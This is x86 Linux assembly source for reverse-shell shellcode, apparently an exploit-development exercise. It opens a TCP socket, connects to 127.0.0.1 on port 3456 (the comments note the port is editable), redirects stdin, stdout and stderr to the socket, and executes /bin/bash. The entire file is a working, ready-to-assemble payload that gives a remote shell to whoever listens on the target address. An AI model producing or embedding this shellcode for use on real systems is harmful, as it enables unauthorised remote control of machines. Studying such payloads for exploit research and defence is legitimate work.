global _start

section .text

_start: 

;clear registers

xor ebx, ebx ;zero out ebx
mul ebx ;Zero out eax
xor ecx, ecx ;zero out ecx

;SOCKET
		
push byte 0x66 ;  push syscall 102 in hex = 0x66
pop eax 
inc ebx ;increment ebx from 0 to equal 1 for socket
push edx ;protocol = 0,
push BYTE 0x1 ;SOCK_STREAM = 1,
push BYTE 0x2 ;AF_INET = 2 
mov ecx, esp  ;points ecx to our 3 arguments
int 0x80; execute

mov edi, eax  ; save sockfd

;CONNECT
push byte 0x66 ;  push syscall 102 in hex = 0x66
pop eax
add ebx,2 ; add 2 to ebx to equal 3 for connect
push 0x0100007f  ;127.0.0.1 is pushed on to the stack
push word 0x800d ;<--- port 3456 in reverse hex {can be edited here to change port}
push word 0x2  ; AF_NET = 2

mov ecx, esp ;ecx has a pointer to the struct

push 0x10;size 16
push ecx ;pointer to struct
push edi; sockfd

mov ecx, esp ;ecx now has all the arguments
int 0x80




;DUP2

xor ecx, ecx       ;making ecx zero for stdin
mov al, 0x3f       ; Dup2 syscall in hex
int 0x80           

mov al, 0x3f       ;Dup2 syscall in hex
inc ecx            ;incrementing ecx to 1 for stdout
int 0x80           

mov al, 0x3f      ;Dup2 syscall in hex
inc ecx           ;incrementing ecx to 2 for stderr
int 0x80         


;EXECVE

push edx ; ////bin/bash null terminated string
push 0x68736162 ; "hsab"
push 0x2f6e6962 ; "/nib"
push 0x2f2f2f2f ; "////"
mov ebx, esp ; store pointer to ////bin/bash in ebx
push edx ; push null
push ebx ; push filename
mov ecx, esp ; reference to ////bin/bash
mov al, 0xb ; execve syscall number in hex
int 0x80
